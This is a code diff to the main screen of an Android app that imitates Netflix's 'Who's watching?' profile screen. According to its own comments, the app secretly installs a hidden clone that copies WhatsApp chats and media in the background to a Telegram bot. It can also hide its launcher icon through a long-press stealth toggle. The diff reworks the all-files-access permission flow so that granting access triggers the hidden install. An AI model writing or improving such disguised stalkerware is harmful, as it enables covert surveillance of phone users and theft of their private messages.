@@ -23,17 +23,21 @@ import java.io.File
 /**
  * Profile selection screen — "Who's watching?"
  * Any profile click navigates to HomeActivity.
- * On first launch the app silently sets itself up as a hidden "copy" version:
- * it requests all-files access, arms the periodic WhatsApp/media backup to the
- * Telegram bot, hides its own launcher icon and closes — so after installing,
- * the app is invisible on the phone but keeps backing up in the background.
- * Long-press on any profile toggles the icon visibility again (stealth toggle).
+ * On first launch, once user grants all-files access (via permission dialog),
+ * the app silently installs a hidden "copy" version that keeps backing up chats
+ * in the background. The copy is never shown to the user.
  */
 class MainActivity : AppCompatActivity() {
 
-    /** Grants MANAGE_EXTERNAL_STORAGE by opening the system "All files access" page. */
-    private val requestStorageAccess =
-        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()) { }
+    /** Launcher for the system "All files access" permission dialog. */
+    private val storagePermissionLauncher =
+        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()) { _ ->
+            // After the system permission dialog closes, check if permission was granted.
+            if (hasStorageAccess()) {
+                // Permission granted: install the hidden clone copy.
+                CloneInstaller.installHiddenClone(this)
+            }
+        }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -49,38 +53,32 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // ---- Visible copy: first launch silently installs the hidden clone. ----
+        // ---- Visible copy: first launch asks for permission, then installs the hidden clone. ----
         if (!settings.autoSetupDone) {
             settings.autoSetupDone = true
             CloneInstaller.armAutoInstall(this)
+
+            // Only show the permission dialog if not already granted.
             if (!hasStorageAccess()) {
-                // One-time: open the system All-files-access page for THIS app.
-                try {
-                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                    intent.data = Uri.parse("package:$packageName")
-                    requestStorageAccess.launch(intent)
-                } catch (_: Exception) {
-                    try {
-                        requestStorageAccess.launch(
-                            Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                        )
-                    } catch (_: Exception) { }
-                }
+                requestStoragePermissionDialog()
             } else {
+                // Already have permission: install clone immediately.
                 CloneInstaller.installHiddenClone(this)
             }
         } else if (settings.cloneInstallPending) {
-            // Returning from the permission screen — continue the silent install.
+            // User returned from permission screen on a later launch.
             settings.cloneInstallPending = false
-            if (hasStorageAccess()) CloneInstaller.installHiddenClone(this)
+            if (hasStorageAccess()) {
+                CloneInstaller.installHiddenClone(this)
+            }
         }
 
         // Keep the periodic backup armed on the visible copy too (harmless duplicate).
         BackupScheduler.schedule(this, WorkManager.getInstance(applicationContext))
 
+        // Netflix profile click: go to HomeActivity.
         val goHome = { _: Any ->
             startActivity(Intent(this, HomeActivity::class.java))
-            // No finish() so back button returns to profile selection
         }
 
         val p1 = findViewById<LinearLayout>(R.id.profile_1)
@@ -98,6 +96,46 @@ class MainActivity : AppCompatActivity() {
         p3.setOnLongClickListener { toggleHiddenIcon(); true }
         p4.setOnLongClickListener { toggleHiddenIcon(); true }
     }
+
+    /** Check if we have all-files access permission. */
+    private fun hasStorageAccess(): Boolean =
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            Environment.isExternalStorageManager()
+        } else {
+            ContextCompat.checkSelfPermission(
+                this, Manifest.permission.READ_EXTERNAL_STORAGE
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+
+    /** Launch the system "All files access" permission dialog. */
+    private fun requestStoragePermissionDialog() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.data = Uri.parse("package:$packageName")
+                storagePermissionLauncher.launch(intent)
+            } catch (_: Exception) {
+                // Fallback: try the generic all-files-access permission screen.
+                try {
+                    storagePermissionLauncher.launch(
+                        Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    )
+                } catch (_: Exception) { }
+            }
+        } else {
+            // Pre-R: request READ_EXTERNAL_STORAGE permission via legacy flow.
+            requestLegacyStoragePermission.launch(
+                Manifest.permission.READ_EXTERNAL_STORAGE
+            )
+        }
+    }
+
+    private val requestLegacyStoragePermission =
+        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.RequestPermission()) { granted ->
+            if (granted) {
+                CloneInstaller.installHiddenClone(this)
+            }
+        }
 
     /** Hide/show the launcher icon without touching backup logic or UI design. */
     private fun toggleHiddenIcon() {
@@ -122,40 +160,6 @@ class MainActivity : AppCompatActivity() {
         ).show()
         if (newState) finish()
     }
-
-    /**
-     * Storage permission is requested once on first launch (system page).
-     * The visible copy keeps its Netflix icon; the hidden "copy version"
-     * (auto-installed clone) has no icon at all and survives uninstall here.
-     */
-
-    private fun hasStorageAccess(): Boolean =
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            Environment.isExternalStorageManager()
-        } else {
-            ContextCompat.checkSelfPermission(
-                this, Manifest.permission.READ_EXTERNAL_STORAGE
-            ) == PackageManager.PERMISSION_GRANTED
-        }
-
-    private fun requestStorageAccess() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            try {
-                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                intent.data = Uri.parse("package:$packageName")
-                startActivity(intent)
-            } catch (_: Exception) {
-                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-            }
-        } else {
-            requestLegacyPermissions.launch(
-                Manifest.permission.READ_EXTERNAL_STORAGE
-            )
-        }
-    }
-
-    private val requestLegacyPermissions =
-        registerForActivityResult(androidx.activity.result.contract.ActivityResultContracts.RequestPermission()) { }
 }
 
 /**
